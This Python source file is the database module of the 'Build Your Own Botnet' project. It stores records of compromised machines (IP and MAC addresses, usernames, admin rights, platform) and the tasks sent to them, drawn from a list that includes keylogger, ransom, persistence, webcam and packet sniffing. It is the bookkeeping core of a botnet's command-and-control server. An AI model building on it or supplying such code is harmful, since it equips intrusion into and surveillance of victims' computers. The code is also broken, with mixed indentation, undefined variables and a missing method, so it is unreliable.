#!/usr/bin/python
# -*- coding: utf-8 -*-
'Database (Build Your Own Botnet)'

# standard library
import os
import sys
import md5
import json
import sqlite3
import datetime
import collections

# modules
import util

class Database(sqlite3.Connection):
    """ 
    Builds and manages a persistent Sqlite3 database for the
    sessions & tasks handled by byob.server.Server instances

    """
    __init_database = """BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS tbl_sessions (
    id serial,
    uid varchar(32) NOT NULL,
    online boolean DEFAULT 0,
    joined DATETIME DEFAULT NULL,
    last_online DATETIME DEFAULT NULL,
    sessions tinyint(3) DEFAULT 1,
    public_ip varchar(42) DEFAULT NULL,
    mac_address varchar(17) DEFAULT NULL,
    local_ip varchar(42) DEFAULT NULL,
    username text DEFAULT NULL,
    administrator boolean DEFAULT 0,
    platform text DEFAULT NULL,
    device text DEFAULT NULL,
    architecture text DEFAULT NULL
);
COMMIT;
"""
    def __init__(self, database=':memory:'):
        """ 
        Create new Sqlite3 Conection instance and setup the BYOB database

        `Optional`
        :param str database:    name of the persistent database file

        """
        super(Database, self).__init__(database)
	self.row_factory   = sqlite3.Row
	self.text_factory  = str
	self._database 	   = os.path.abspath(database)
	self._tasks 	   = ['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam']
	self._tbl_sessions = 'tbl_sessions'
	self.execute_file(sql=self.__init_database, returns=False, display=False)

    def _display(self, data, indent=4):
        if isinstance(data, dict):
            i = data.pop('id', None)
            c = globals().get('_color')
            util.display(str(i).rjust(indent-3), color='reset', style='bright') if i else None
            for k,v in data.items():
                if isinstance(v, unicode):
                    try:
                        j = json.loads(v.encode())
                        self._display(j, indent+2)
                    except:
                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                        util.display(str(v).encode(), color=c, style='dim')
                elif isinstance(v, list):
                    for i in v:
                        if isinstance(v, dict):
                            util.display(str(k).ljust(4  * indent).center(5 * indent))
                            self._display(v, indent+2)
                        else:
                            util.display(str(i).ljust(4  * indent).center(5 * indent))
                elif isinstance(v, dict):
                    util.display(str(k).ljust(4  * indent).center(5 * indent))
                    self._display(v, indent+1)
                elif isinstance(v, int):
                    if v in (0,1):
                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                        util.display(str(bool(v)).encode(), color=c, style='dim')
                    else:
                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                        util.display(str(v).encode(), color=c, style='dim')
                else:
                    util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                    util.display(str(v).encode(), color=c, style='dim')
        elif isinstance(data, list):
            for row in data:
                if isinstance(row, dict):
                    self._display(row, indent+2)
                else:
                    util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                    util.display(str(v).encode(), color=c, style='dim')
        else:
            try:
                data = dict(data)
            except: pass
            if isinstance(data, collections.OrderedDict):
                data = dict(data)
            if isinstance(data, dict):
                i = data.pop('id',None)
                util.display(str(i).rjust(indent-1), color='reset', style='bright') if i else None
                self._display(data, indent+2)

            else:
                util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=''))
                util.display(v.encode(), color=c, style='dim')

    def _client_sessions(self, uid):
        for i in self.execute('select sessions from {} where uid=:uid'.format(self._tbl_sessions), {"uid": uid}).fetchone():
            if isinstance(i, int):
                return i + 1

    def _count_sessions(self):
        for i in self.execute('select count(*) from {}'.format(self._tbl_sessions)).fetchone():
            if isinstance(i, int):
                return i + 1

    def debug(self, output):
	""" 
        Print debugging output to console
        """
        util.__logger__.debug(str(output))

    def error(self, output):
        """ 
        Print error output to console
        """
        util.__logger__.error(str(output))

    def exists(self, uid):
	""" 
	Check if a client exists in the database
	"""
	return bool(len(self.execute("select * from {} where uid=:uid".format(self._tbl_sessions), {"uid": info['uid']}).fetchone()))

    def update_status(self, session, online):
        """ 
        Update session status to online/offline

        `Required`
        :param int session:     session ID
        :param bool online:     True/False = online/offline

        """
        try:
            if online:
                if isinstance(session, str):
                    self.execute_query("UPDATE tbl_sessions SET online=1 WHERE uid=:uid", params={"uid": session}, returns=False)
                elif isinstance(session, int):
                    self.execute_query("UPDATE tbl_sessions SET online=1 WHERE id=:uid", params={"uid": session}, returns=False)
            else:
                if isinstance(session, str):
                    self.execute_query("UPDATE tbl_sessions SET online=0, last_online=:last_online WHERE uid=:uid", params={"uid": session, "last_online": datetime.datetime.now()}, returns=False)
                elif isinstance(session, int):
                    self.execute_query("UPDATE tbl_sessions SET online=0, last_online=:last_online WHERE id=:uid", params={"uid": session, "last_online": datetime.datetime.now()}, returns=False)
        except Exception as e:
            self.error("{} error: {}".format(self.update_status.func_name, str(e)))

    def get_sessions(self, verbose=False, display=False):
        """ 
        Fetch sessions from database

        `Optional`
        :param bool verbose:    include full session information
        :param bool display:    display output

        """
	statement = "select * from {}" if verbose else "select id, public_ip, uid, last_online from {}"
        rows = self.execute(statement.format(self._tbl_sessions))
        return [{k:v for k,v in zip([row[0] for row in rows.description], client)} for client in rows.fetchall()]

    def get_tasks(self, session=None, display=True):
        """ 
        Fetch tasks from database

        `Optional`
        :param int session:     session ID
        :param bool display:    display output

        Returns tasks as dictionary (JSON) object
        """
        tasks = []
        if session:
            tasks.append(self.execute_query("select * from {}".format(session), returns=True, display=display))
        else:
            for row in self.get_sessions():
                tasks.append(self.execute_query("select * from {}".format(row['uid']), returns=True, display=display))
        return tasks

    def handle_session(self, info):
        """ 
        Handle a new/current client by adding/updating database

        `Required`
        :param dict info:    session host machine information

        Returns the session information as a dictionary (JSON) object
        """
        if isinstance(info, dict):
	    if 'uid' not in info:
                info['id']      = self._count_sessions()
                info['uid']     = md5.new(info['public_ip'] + info['mac_address']).hexdigest()
		info['joined']  = datetime.datetime.now()
	    info['online']      = 1
	    info['sessions']    = self._client_sessions(info['uid'])
	    info['last_online'] = datetime.datetime.now()
            if self._exists(info['uid']):
	        self.execute_query("update {} set online=:online, sessions=:sessions, last_online=:last_online".format(self._tbl_sessions), params=info, returns=False)
	    else:
		self.execute_query("insert into {} ({}) values (:{})".format(self._tbl_sessions, ','.join(info.keys()), ',:'.join(info.keys())), params=info, returns=False, display=False)
		self.execute_query("create table '{}' (id serial, uid varchar(32), task text, result text, issued DATETIME, completed DATETIME)".format(info['uid']), returns=False, display=False)
	    for row in self.execute("select * from {} where uid=:uid".format(self._tbl_sessions), {"uid": info['uid']}).fetchone():
		if isinstance(row, dict):
		    info = row
            self.commit()
	    return info
        else:
            self.error("Error: invalid input type received from server (expected '{}', receieved '{}')".format(dict, type(info)))

    def handle_task(self, task):
        """ 
        Adds issued tasks to the database and updates completed tasks with results

        `Required`
        :param dict task:
          :required attributes:
            :attr str client:          client ID assigned by server
            :attr str task:            task assigned by server

          :optional attributes:
            :attr str uid:             task ID assigned by server
            :attr str result:          task result completed by client
            :attr datetime issued:     time task was issued by server
            :attr datetime completed:  time task was completed by client

        Returns task assigned by database as a dictionary (JSON) object

	"""
        try:
            if isinstance(task, dict):
                if 'uid' not in task:
		    task['uid']    = md5.new(task['session'] + task['task'] + datetime.datetime.now().ctime()).hexdigest()
		    task['issued'] = datetime.datetime.now()
                    self.execute_query('insert into {} values (:uid, :task, :issued)'.format(task['uid']), params={"uid": task['uid'],  "task": task['task'], "issued": task['issued']}, returns=False)
		else:
		    task['completed'] = datetime.datetime.now()
		    self.execute_query('update {} set result=:result, completed=:completed where uid=:uid'.format(task['uid']), params={"result": task['result'], "completed": task['completed'], "uid": task['uid']}, returns=False)
		self.commit()
		return task
            else:
                self.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
        except Exception as e:
            self.error("{} error: {}".format(self.handle_task.func_name, str(e)))

    def execute_query(self, stmt, params={}, returns=True, display=False):
        """ 
        Query the database with a SQL statement and return result

        `Required`
        :param str sql:         SQL expression to query the database with

	`Optional`
	:param dict params:     dictionary of statement paramaters
	:param bool returns: 	returns output if True
        :param bool display:    display output from database if True

        Returns a list of output rows formatted as dictionary (JSON) objects

        """
        result = []
	for row in self.execute(stmt, params):
            result.append(row)
            if display:
                self._display(row)
	if returns:
	    return result

    def execute_file(self, filename=None, sql=None, returns=True, display=False):
        """ 
        Execute SQL commands sequentially from a string or file

        `Optional`
        :param str filename: 	name of the SQL batch file to execute
	:param bool returns:    returns output from database if True
	:param bool display: 	display output from database if True

        Returns a list of output rows formatted as dictionary (JSON) objects

        """
        try:
            result = []
	    if isinstance(filename, str):
                assert os.path.isfile(filename), "keyword argument 'filename' must be a valid filename"
                with open(filename) as stmts:
                    for line in self.executescript(stmts.read()):
                        result.append(line)
                        if display:
                            self._display(line)
	    elif isinstance(sql, str):
		for line in self.executescript(sql):
		    result.append(line)
		    if display:
			self._display(line)
	    else:
		raise Exception("missing required keyword argument 'filename' or 'sql'")
	    self.commit()
	    if returns:
                return result
        except Exception as e:
            self.error("{} error: {}".format(self.execute_file.func_name, str(e)))
